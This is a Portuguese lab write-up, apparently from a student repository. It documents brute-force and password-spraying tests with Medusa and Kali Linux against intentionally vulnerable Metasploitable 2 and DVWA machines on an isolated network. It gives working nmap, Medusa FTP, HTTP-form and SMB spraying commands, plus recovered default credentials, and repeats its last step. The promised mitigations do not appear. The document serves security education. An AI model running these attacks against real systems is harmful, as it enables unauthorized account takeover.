Auditoria de Segurança e Testes de Força Bruta com Kali Linux e Medusa

> **Aviso Legal:** Todos os testes documentados neste repositório foram realizados exclusivamente em ambiente virtualizado, isolado (rede *Host-Only*) e controlado, utilizando máquinas propositalmente vulneráveis para fins estritamente educacionais.
Sobre o Projeto
Este projeto demonstra a execução de testes de intrusão focados em quebra de autenticação (Força Bruta e *Password Spraying*) utilizando a ferramenta **Medusa** no **Kali Linux** contra o ambiente **Metasploitable 2** e a aplicação web **DVWA**, além de propor medidas técnicas de mitigação para cada vetor explorado.

Arquitetura do Laboratório
* **Hypervisor:** Oracle VirtualBox
* **Configuração de Rede:** Host-Only Adapter (Rede Interna Isolada)
* **Máquina Atacante:** Kali Linux (`192.168.56.103`)
* **Máquina Alvo:** Metasploitable 2 (`192.168.56.102`)
Fase 1: Reconhecimento (Nmap)
Identificação dos serviços e versões em execução no alvo:

```bash
nmap -sV -p 21,80,139,445 192.168.56.102

Porta 21 (FTP): vsftpd 2.3.4

Porta 80 (HTTP): Apache httpd 2.2.8 (hospedando DVWA)

Portas 139/445 (SMB): Samba smbd 3.X

Fase 2: Execução dos Ataques Simulados

1. Força Bruta no Serviço FTP
Teste automatizado combinando listas de usuários e senhas contra o daemon FTP:
Bash
medusa -h 192.168.56.102 -U wordlist/users.txt -P wordlist/passwords.txt -M ftp -t 4
Resultado: Credenciais válidas obtidas (msfadmin:msfadmin, user:user, postgres:postgres).
Validação: Acesso realizado via cliente ftp confirmando leitura de diretórios.

2. Automação em Formulário Web (DVWA - Nível Low)
Após capturar o token de sessão (PHPSESSID) autenticado no DVWA, o módulo http do Medusa foi configurado para identificar a resposta negativa da aplicação (DENY-SIGNAL):
Bash
medusa -h 192.168.56.102 -u admin -P wordlist/passwords.txt -M http \
  -m DIR:/dvwa/vulnerabilities/brute/ \
  -m FORM:"username=^USER^&password=^PASS^&Login=Login" \
  -m COOKIE:"PHPSESSID=<SEU_PHPSESSID>; security=low" \
  -m DENY-SIGNAL:"Username and/or password incorrect."
Resultado: Senha password identificada para o usuário admin.
3. Enumeração de Usuários e Password Spraying em SMB
Primeiro, foram extraídos os usuários válidos do sistema via RPC/SMB:
Bash
enum4linux -U 192.168.56.102 | grep "user:"
Em seguida, aplicou-se a técnica de Password Spraying (uma senha testada contra múltiplos usuários):
Bash
medusa -h 192.168.56.102 -U wordlists/smb_users.txt -p "msfadmin" -M smbnt
Resultado: Identificação imediata de contas utilizando senhas padrão sem acionar bloqueios por tentativas excessivas em uma única conta.
Bash
medusa -h 192.168.56.102 -U wordlists/smb_users.txt -p "msfadmin" -M smbnt
Resultado: Identificação imediata de contas utilizando senhas padrão sem acionar bloqueios por tentativas excessivas em uma única conta.
